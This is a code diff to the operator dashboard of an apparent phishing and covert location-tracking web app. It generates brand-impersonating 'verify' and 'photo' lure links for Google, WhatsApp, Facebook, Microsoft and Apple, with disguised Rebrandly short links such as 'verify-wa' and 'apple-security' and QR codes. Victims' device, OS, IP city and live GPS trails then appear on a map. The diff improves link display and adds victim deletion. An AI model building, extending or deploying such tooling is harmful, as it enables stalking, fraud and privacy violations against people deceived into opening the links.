@@ -7,7 +7,6 @@
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
-        /* ===== SAME STYLES AS BEFORE ===== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
@@ -62,12 +61,21 @@
             border-bottom: 1px solid #2a2a4a;
             display: flex;
             flex-wrap: wrap;
-            align-items: center;
-            gap: 10px 16px;
+            align-items: flex-start;
+            gap: 12px 20px;
             z-index: 1000;
             position: relative;
+            max-height: 140px;
+            overflow-y: auto;
         }
         #linkPanel .section {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            min-width: 200px;
+            flex: 1;
+        }
+        #linkPanel .section .row {
             display: flex;
             align-items: center;
             gap: 6px;
@@ -79,6 +87,7 @@
             color: #888;
             text-transform: uppercase;
             letter-spacing: 0.5px;
+            min-width: 50px;
         }
         #linkPanel select {
             background: #0f0f1a;
@@ -99,8 +108,34 @@
             word-break: break-all;
             color: #4caf50;
             border: 1px solid #1e1e38;
-            min-width: 200px;
             flex: 1;
+            min-width: 150px;
+        }
+        #linkPanel .short-link {
+            color: #ffc107;
+            font-size: 11px;
+            font-family: monospace;
+            background: #0f0f1a;
+            padding: 4px 10px;
+            border-radius: 4px;
+            border: 1px solid #1e1e38;
+        }
+        #linkPanel .server-short {
+            color: #4caf50;
+            font-size: 11px;
+            font-family: monospace;
+            background: #0f0f1a;
+            padding: 4px 10px;
+            border-radius: 4px;
+            border: 1px solid #1e1e38;
+        }
+        #linkPanel .link-label {
+            font-size: 10px;
+            color: #666;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+            min-width: 60px;
         }
         #linkPanel .btn {
             background: #4caf50;
@@ -119,18 +154,9 @@
         #linkPanel .btn-blue:hover { background: #3367d6; }
         #linkPanel .btn-qr { background: #ff9800; }
         #linkPanel .btn-qr:hover { background: #e68900; }
-        #linkPanel .short-link {
-            color: #ffc107;
-            font-size: 11px;
-            font-family: monospace;
-            background: #0f0f1a;
-            padding: 4px 10px;
-            border-radius: 4px;
-            border: 1px solid #1e1e38;
-        }
         #linkPanel .divider {
             width: 1px;
-            height: 28px;
+            min-height: 40px;
             background: #2a2a4a;
         }
 
@@ -191,7 +217,7 @@
 
         #app {
             display: flex;
-            height: calc(100vh - 130px);
+            height: calc(100vh - 220px);
             width: 100vw;
         }
 
@@ -281,6 +307,17 @@
         }
         .user-item .status-dot.online { background: #4caf50; box-shadow: 0 0 8px #4caf50; }
         .user-item .status-dot.offline { background: #555; }
+        .user-item .delete-btn {
+            background: transparent;
+            border: none;
+            color: #888;
+            cursor: pointer;
+            font-size: 14px;
+            padding: 2px 6px;
+            border-radius: 4px;
+            transition: 0.2s;
+        }
+        .user-item .delete-btn:hover { background: #e94560; color: white; }
 
         #mapContainer {
             flex: 1;
@@ -314,7 +351,8 @@
             #mapContainer { height: 60%; }
             #topBar .stats { display: none; }
             #linkPanel .link-display { min-width: 100px; font-size: 10px; }
-            #linkPanel { flex-direction: column; align-items: stretch; }
+            #linkPanel { flex-direction: column; align-items: stretch; max-height: 200px; }
+            #linkPanel .section { min-width: 100%; }
         }
         ::-webkit-scrollbar { width: 4px; }
         ::-webkit-scrollbar-track { background: #0f0f1a; }
@@ -341,51 +379,89 @@
 <div id="linkPanel">
     <!-- ====== VERIFY SECTION ====== -->
     <div class="section">
-        <label>📤 Verify</label>
-        <select id="brandSelect">
-            <option value="google">🔵 Google</option>
-            <option value="whatsapp" selected>💬 WhatsApp</option>
-            <option value="facebook">🔷 Facebook</option>
-            <option value="microsoft">⬡ Microsoft</option>
-            <option value="apple"> Apple</option>
-        </select>
-        <span class="link-display" id="linkDisplay">https://location-tracker-cn7m.onrender.com/google/verify</span>
-        <span class="short-link" id="shortLinkDisplay">/s/google</span>
-        <button class="btn" id="copyLinkBtn">📋 Copy Short</button>
-        <button class="btn btn-blue" id="copyFullLinkBtn">📋 Copy Full</button>
+        <div class="row">
+            <label>📤 Verify</label>
+            <select id="brandSelect">
+                <option value="google">🔵 Google</option>
+                <option value="whatsapp" selected>💬 WhatsApp</option>
+                <option value="facebook">🔷 Facebook</option>
+                <option value="microsoft">⬡ Microsoft</option>
+                <option value="apple"> Apple</option>
+            </select>
+        </div>
+        <!-- Full URL -->
+        <div class="row">
+            <span class="link-label">🔗 Full:</span>
+            <span class="link-display" id="linkDisplay">https://location-tracker-cn7m.onrender.com/whatsapp/verify</span>
+        </div>
+        <!-- Rebrandly (YOUR OLD SHORT LINKS) – Now Clearly Visible -->
+        <div class="row">
+            <span class="link-label">🔗 Rebrandly:</span>
+            <span class="short-link" id="shortLinkDisplay">rebrand.ly/verify-wa</span>
+        </div>
+        <!-- Server Short Link (Works on phones) -->
+        <div class="row">
+            <span class="link-label">⚡ Server:</span>
+            <span class="server-short" id="serverShortDisplay">/s/whatsapp</span>
+        </div>
+        <!-- Buttons -->
+        <div class="row">
+            <button class="btn" id="copyLinkBtn">📋 Copy Short</button>
+            <button class="btn btn-blue" id="copyFullLinkBtn">📋 Copy Full</button>
+        </div>
     </div>
 
     <div class="divider"></div>
 
     <!-- ====== PHOTO SECTION ====== -->
     <div class="section">
-        <label>📸 Photo</label>
-        <select id="photoTemplateSelect">
-            <option value="google">🔵 Google</option>
-            <option value="whatsapp" selected>💬 WhatsApp</option>
-            <option value="facebook">🔷 Facebook</option>
-            <option value="microsoft">⬡ Microsoft</option>
-            <option value="apple"> Apple</option>
-        </select>
-        <span class="link-display" id="photoLinkDisplay">https://location-tracker-cn7m.onrender.com/google/photo</span>
-        <span class="short-link" id="photoShortLink">/sp/google</span>
-        <button class="btn" id="copyPhotoLinkBtn">📋 Copy Short</button>
-        <button class="btn btn-blue" id="copyFullPhotoLinkBtn">📋 Copy Full</button>
+        <div class="row">
+            <label>📸 Photo</label>
+            <select id="photoTemplateSelect">
+                <option value="google">🔵 Google</option>
+                <option value="whatsapp" selected>💬 WhatsApp</option>
+                <option value="facebook">🔷 Facebook</option>
+                <option value="microsoft">⬡ Microsoft</option>
+                <option value="apple"> Apple</option>
+            </select>
+        </div>
+        <!-- Full URL -->
+        <div class="row">
+            <span class="link-label">🔗 Full:</span>
+            <span class="link-display" id="photoLinkDisplay">https://location-tracker-cn7m.onrender.com/whatsapp/photo</span>
+        </div>
+        <!-- Rebrandly (YOUR OLD SHORT LINKS) – Now Clearly Visible -->
+        <div class="row">
+            <span class="link-label">🔗 Rebrandly:</span>
+            <span class="short-link" id="photoShortLink">rebrand.ly/view-photo-wa</span>
+        </div>
+        <!-- Server Short Link (Works on phones) -->
+        <div class="row">
+            <span class="link-label">⚡ Server:</span>
+            <span class="server-short" id="photoServerShort">/sp/whatsapp</span>
+        </div>
+        <!-- Buttons -->
+        <div class="row">
+            <button class="btn" id="copyPhotoLinkBtn">📋 Copy Short</button>
+            <button class="btn btn-blue" id="copyFullPhotoLinkBtn">📋 Copy Full</button>
+        </div>
     </div>
 
     <div class="divider"></div>
 
     <!-- ====== QR SECTION ====== -->
     <div class="section">
-        <label>📱 QR</label>
-        <select id="qrTemplateSelect">
-            <option value="google">🔵 Google</option>
-            <option value="whatsapp" selected>💬 WhatsApp</option>
-            <option value="facebook">🔷 Facebook</option>
-            <option value="microsoft">⬡ Microsoft</option>
-            <option value="apple"> Apple</option>
-        </select>
-        <button class="btn btn-qr" id="generateQrBtn">🔄 Generate QR</button>
+        <div class="row">
+            <label>📱 QR</label>
+            <select id="qrTemplateSelect">
+                <option value="google">🔵 Google</option>
+                <option value="whatsapp" selected>💬 WhatsApp</option>
+                <option value="facebook">🔷 Facebook</option>
+                <option value="microsoft">⬡ Microsoft</option>
+                <option value="apple"> Apple</option>
+            </select>
+            <button class="btn btn-qr" id="generateQrBtn">🔄 Generate QR</button>
+        </div>
     </div>
 </div>
 
@@ -428,9 +504,22 @@
     // =============================================
     const BASE_URL = 'https://location-tracker-cn7m.onrender.com'; // CHANGE TO YOUR URL
 
-    // 🆕 Using built-in short links (no Rebrandly needed)
-    function getShortLink(brand, type) {
-        // type: 'verify' or 'photo'
+    // 🆕 YOUR OLD REBRANDLY SHORT LINKS – All here, displayed in the UI
+    const SHORT_LINKS = {
+        google: 'rebrand.ly/verify-google',
+        whatsapp: 'rebrand.ly/verify-wa',
+        facebook: 'rebrand.ly/verify-FACEBOOK',
+        microsoft: 'rebrand.ly/verify-ms',
+        apple: 'rebrand.ly/apple-security',
+
+        photo_google: 'rebrand.ly/view-photo-google',
+        photo_whatsapp: 'rebrand.ly/view-photo-wa',
+        photo_facebook: 'rebrand.ly/view-photo-fb',
+        photo_microsoft: 'rebrand.ly/view-photo-ms',
+        photo_apple: 'rebrand.ly/view-photo-apple'
+    };
+
+    function getServerShort(brand, type) {
         if (type === 'verify') return BASE_URL + '/s/' + brand;
         return BASE_URL + '/sp/' + brand;
     }
@@ -443,12 +532,14 @@
     const qrTemplateSelect = document.getElementById('qrTemplateSelect');
 
     const linkDisplay = document.getElementById('linkDisplay');
-    const shortLinkDisplay = document.getElementById('shortLinkDisplay');
+    const shortLinkDisplay = document.getElementById('shortLinkDisplay');     // Rebrandly
+    const serverShortDisplay = document.getElementById('serverShortDisplay'); // Server
     const copyLinkBtn = document.getElementById('copyLinkBtn');
     const copyFullLinkBtn = document.getElementById('copyFullLinkBtn');
 
     const photoLinkDisplay = document.getElementById('photoLinkDisplay');
-    const photoShortLink = document.getElementById('photoShortLink');
+    const photoShortLink = document.getElementById('photoShortLink');         // Rebrandly
+    const photoServerShort = document.getElementById('photoServerShort');     // Server
     const copyPhotoLinkBtn = document.getElementById('copyPhotoLinkBtn');
     const copyFullPhotoLinkBtn = document.getElementById('copyFullPhotoLinkBtn');
 
@@ -464,21 +555,25 @@
     function updateLink() {
         const brand = brandSelect.value;
         const fullUrl = BASE_URL + '/' + brand + '/verify';
-        const shortUrl = getShortLink(brand, 'verify');
+        const rebrandly = SHORT_LINKS[brand] || '';
+        const serverShort = getServerShort(brand, 'verify');
+
         linkDisplay.textContent = fullUrl;
-        shortLinkDisplay.textContent = shortUrl;
+        shortLinkDisplay.textContent = rebrandly;          // 👈 Rebrandly is back and visible!
+        serverShortDisplay.textContent = serverShort;
     }
     brandSelect.addEventListener('change', updateLink);
     updateLink();
 
+    // "Copy Short" copies the SERVER short link (works on phones)
     copyLinkBtn.addEventListener('click', function() {
-        const linkToCopy = shortLinkDisplay.textContent;
+        const linkToCopy = serverShortDisplay.textContent;
         navigator.clipboard.writeText(linkToCopy).then(() => {
             copyLinkBtn.textContent = '✅ Copied!';
             setTimeout(() => copyLinkBtn.textContent = '📋 Copy Short', 2000);
         }).catch(() => {
             const range = document.createRange();
-            range.selectNode(shortLinkDisplay);
+            range.selectNode(serverShortDisplay);
             window.getSelection().removeAllRanges();
             window.getSelection().addRange(range);
             document.execCommand('copy');
@@ -509,21 +604,25 @@
     function updatePhotoLink() {
         const template = photoTemplateSelect.value;
         const fullUrl = BASE_URL + '/' + template + '/photo';
-        const shortUrl = getShortLink(template, 'photo');
+        const rebrandly = SHORT_LINKS['photo_' + template] || '';
+        const serverShort = getServerShort(template, 'photo');
+
         photoLinkDisplay.textContent = fullUrl;
-        photoShortLink.textContent = shortUrl;
+        photoShortLink.textContent = rebrandly;           // 👈 Rebrandly is back and visible!
+        photoServerShort.textContent = serverShort;
     }
     photoTemplateSelect.addEventListener('change', updatePhotoLink);
     updatePhotoLink();
 
+    // "Copy Short" copies the SERVER short link (works on phones)
     copyPhotoLinkBtn.addEventListener('click', function() {
-        const linkToCopy = photoShortLink.textContent;
+        const linkToCopy = photoServerShort.textContent;
         navigator.clipboard.writeText(linkToCopy).then(() => {
             copyPhotoLinkBtn.textContent = '✅ Copied!';
             setTimeout(() => copyPhotoLinkBtn.textContent = '📋 Copy Short', 2000);
         }).catch(() => {
             const range = document.createRange();
-            range.selectNode(photoShortLink);
+            range.selectNode(photoServerShort);
             window.getSelection().removeAllRanges();
             window.getSelection().addRange(range);
             document.execCommand('copy');
@@ -553,7 +652,7 @@
     // =============================================
     generateQrBtn.addEventListener('click', function() {
         const template = qrTemplateSelect.value;
-        const url = BASE_URL + '/s/' + template; // use short link for QR
+        const url = BASE_URL + '/s/' + template;
         qrCodeImg.src = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=' + encodeURIComponent(url);
         qrPopup.style.display = 'flex';
     });
@@ -569,7 +668,7 @@
     qrPopup.addEventListener('click', function(e) { if (e.target === qrPopup) qrPopup.style.display = 'none'; });
 
     // =============================================
-    // MAP SETUP (unchanged)
+    // MAP SETUP
     // =============================================
     const map = L.map('map', { zoomControl: false }).setView([51.505, -0.09], 13);
     L.control.zoom({ position: 'topright' }).addTo(map);
@@ -613,7 +712,30 @@
     }
 
     // =============================================
-    // RENDER USERS
+    // DELETE USER
+    // =============================================
+    function deleteUser(sessionId) {
+        if (!confirm(`Delete user ${sessionId} permanently?`)) return;
+        fetch('/delete-user/' + sessionId, { method: 'DELETE' })
+            .then(res => res.json())
+            .then(data => {
+                if (data.status === 'deleted') {
+                    const item = document.querySelector(`.user-item[data-sid="${sessionId}"]`);
+                    if (item) item.remove();
+                    if (markers[sessionId]) {
+                        if (markers[sessionId].marker) map.removeLayer(markers[sessionId].marker);
+                        if (markers[sessionId].circle) map.removeLayer(markers[sessionId].circle);
+                        if (markers[sessionId].pathLine) map.removeLayer(markers[sessionId].pathLine);
+                        delete markers[sessionId];
+                    }
+                    fetchUsers();
+                }
+            })
+            .catch(err => console.error('Delete error:', err));
+    }
+
+    // =============================================
+    // RENDER USERS (with delete button)
     // =============================================
     function renderUsers(users) {
         const list = document.getElementById('userList');
@@ -637,7 +759,7 @@
             const deviceName = deviceInfo.model;
             const osName = deviceInfo.os;
             const lastSeen = u.timestamp ? new Date(u.timestamp).toLocaleTimeString() : '--';
-            const isActive = lat && lng;
+            const isActive = u.active !== false && lat && lng;
             const color = markers[sid] ? markers[sid].color : getColor();
             const initial = deviceName.charAt(0) || '?';
 
@@ -647,9 +769,10 @@
                     <div class="info">
                         <div class="name">${deviceName}</div>
                         <div class="device">${osName} · ${u.ip_city || 'N/A'}</div>
-                        <div class="last-seen">🕐 ${lastSeen}</div>
+                        <div class="last-seen">🕐 ${lastSeen} ${!isActive ? '🔴 Offline' : ''}</div>
                     </div>
                     <div class="status-dot ${isActive ? 'online' : 'offline'}"></div>
+                    <button class="delete-btn" onclick="event.stopPropagation(); deleteUser('${sid}')">✕</button>
                 </div>
             `;
         });
@@ -692,7 +815,8 @@
             const sid = u.session_id || 'unknown';
             const lat = u.lat;
             const lng = u.lng;
-            if (lat && lng) {
+            const isActive = u.active !== false && lat && lng;
+            if (lat && lng && isActive) {
                 activeSessions.add(sid);
                 if (!markers[sid]) {
                     const color = getColor();
@@ -771,7 +895,7 @@
     }
 
     function updateStats(users) {
-        const live = users.filter(u => u.lat && u.lng).length;
+        const live = users.filter(u => u.active !== false && u.lat && u.lng).length;
         document.getElementById('userCount').textContent = live;
         document.getElementById('locationCount').textContent = users.length;
         if (users.length > 0) {
@@ -791,7 +915,7 @@
     window.addEventListener('resize', () => setTimeout(() => map.invalidateSize(), 200));
     setTimeout(() => map.invalidateSize(), 500);
 
-    console.log('📍 Dashboard ready – using built-in short links (no Rebrandly needed!)');
+    console.log('📍 Dashboard ready – Rebrandly links are back and clearly visible!');
 </script>
 </body>
 </html>
